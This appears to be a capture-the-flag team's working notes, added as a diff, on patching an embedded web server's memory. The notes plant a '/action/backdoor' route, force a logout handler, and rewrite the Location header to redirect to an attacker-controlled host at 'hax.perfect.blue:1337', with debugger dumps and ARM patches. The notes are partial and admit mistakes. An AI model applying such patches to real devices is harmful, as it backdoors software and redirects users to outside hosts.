@@ -1,0 +1,64 @@
+Targets: GET and POST
+
+route uri=/action/submit methods=POST handler=action redirect=200@/
+route uri=/action/logout methods=GET handler=action redirect=200@/
+=> redirects to `http://hax.perfect.blue/hello`
+
+1. `200@/` in redirect hashmap to `200@http://hax.perfect.blue/hello` (actual in-memory struct is different)
+  * 200 slash address:
+    * First
+        * 0x60e72ca0:     0x60e7bb08      0x00000000      0x0000000a      0x00000101
+    * Second
+        * 0x60e72ca0:     0x60e7c158      0x00000000      0x0000000a      0x00000101
+    * Overwrite 0x60e72ca0 to address under our control and put "http://hax.perfect.blue/..." there
+2. `route->prefix` and `route->prefixLen` (set in `websAddRoute`) to match `/action/backdoor`
+    * route for `/action/submit`: 0x60e7bb60
+        * 0x60e7bb60:     0x60e7bba0      0x0000000e      0x00000000      0x00000000
+          0x60e7bb70:     0x00000000      0x60e7a3a0      0xffffffff      0xffffffff
+          0x60e7bb80:     0xffffffff      0xffffffff      0x00000000      0x00000000
+          0x60e7bb90:     0x6004ebc8      0x00000000      0x00000000      0x80000018
+          0x60e7bba0:     0x7463612f      0x2f6e6f69      0x6d627573      0x00007469
+    * route for `/action/logout`: 0x60e7c1b0
+        * 0x60e7c1b0:     0x60e7c1f0      0x0000000e      0x00000000      0x00000000
+          0x60e7c1c0:     0x00000000      0x60e7a3a0      0xffffffff      0xffffffff
+          0x60e7c1d0:     0xffffffff      0xffffffff      0x00000000      0x00000000
+          0x60e7c1e0:     0x6004ebc8      0x00000000      0x00000000      0x80000018
+          0x60e7c1f0:     0x7463612f      0x2f6e6f69      0x6f676f6c      0x00007475
+    * 0x60e7bb60 and 0x60e7c1b0 to address under our control that contains "/action/backdoor"
+    * 0x60e7bb64 and 0x60e7c1b4 to 16
+3. Make them handled by `logoutServiceProc`
+    * 6004D20C - BNE -> always branch to 6004D270
+    * 6004D270 - Set up logoutServiceProc(6004EAA8) to R3
+
+
+Step 1 was incorrect!
+
+WebsKey Returned:
+
+pwndbg> x/20wx 0x60e7c168
+0x60e7c168:     0x00000000      0x60e7c1a0      0x00000000      0x0000000a
+0x60e7c178:     0x00000101      0x60e7c158      0x00000000      0x0000000a
+0x60e7c188:     0x00000101      0x00000000      0x00000012      0x00000000
+0x60e7c198:     0x00000000      0x80000010      0x00303032      0x00000000
+0x60e7c1a8:     0x00000000      0x80000040      0x63001000      0x00000010
+
+0x60e7c17c to address under our control
+
+
+We thought POST patch is needed but flag is GET...
+Some steps might not be needed
+
+
+ROM:60058B90                 LDR             R3, [R11,#var_30]
+ROM:60058B94                 MOV             R2, #aS_4 ; "%s"
+ROM:60058B9C                 MOV             R1, #aLocation ; "Location"
+ROM:60058BA4                 LDR             R0, [R11,#var_28]
+ROM:60058BA8                 BL              websWriteHeader
+ROM:60058BAC                 B               loc_60058C00
+===>
+ROM:60058BA4                 LDR             R0, [R11,#var_28]
+ROM:60058B90                 LDR             R3, [R0, #0x178]
+ROM:60058B94                 MOV             R2, "http://hax.perfect.blue:1337/%s"
+ROM:60058B9C                 MOV             R1, #aLocation ; "Location"
+ROM:60058BA8                 BL              websWriteHeader
+ROM:60058BAC                 B               loc_60058C00
